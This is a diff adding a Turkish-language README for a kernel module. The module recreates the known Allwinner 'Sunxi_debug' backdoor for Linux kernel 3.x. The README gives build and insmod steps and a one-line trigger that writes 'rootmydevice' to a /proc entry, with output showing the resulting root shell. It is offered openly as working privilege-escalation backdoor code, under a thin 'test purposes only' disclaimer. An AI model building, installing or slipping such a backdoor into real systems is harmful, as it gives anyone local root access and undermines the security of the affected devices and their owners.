@@ -1,0 +1,51 @@
+
+Allwinner ARM işlemcileri için geçerli olan bir kernel-backdoor(arkakapı) gün yüzüne çıktı.
+
+Bilgi için aşağıdaki adresi inceleyebilirsiniz.
+http://thehackernews.com/2016/05/android-kernal-exploit.html
+
+Arkakapı: "Sunxi_debug.c" isimli dosya tarafından oluşturulmaktadır.
+
+Bu koddan yola çıkarak "Sunxi_debug.c" benzeri arkakapı oluşturan kod derledim.
+Linux Kernel 3.x için gerekli düzenlemeleri yaptım.
+Kod arkakapı oluşturmaktadır.
+Muhtemelen Kernel 4.x içinde derlenebilir.
+
+Testler olumlu.
+
+Sadece Test amaçlı kod düzenlemesi yapılmıştır.
+Kendisini geliştirmek isteyen arkadaşlar kodu inceleyebilir.
+
+  /proc dosya sistemi içerisinde "sun_debug" dizini ve root dokunuşu için yine
+"sun_debug" dosyası oluşturur.
+
+  "Sunxi_debug.c" dakikalar içerisinde incelenip, dakikalar içerisinde de Linux Kernel için adapte
+edilip, derlenecek hale getirilmiştir. 
+
+Kusur için Affola...
+
+
+
+------KURULUM İŞLEMİ------
+
+# make
+
+# insmod sun.ko
+
+
+
+---------r00t yetkisi için-----------------------
+
+$ echo "rootmydevice" > /proc/sun_debug/sun_debug
+
+$ id
+uid=0(root) gid=0(root) groups=0(root)
+
+
+//////
+
+Analiz
+analiz@safe-mail.net
+
+//////
+
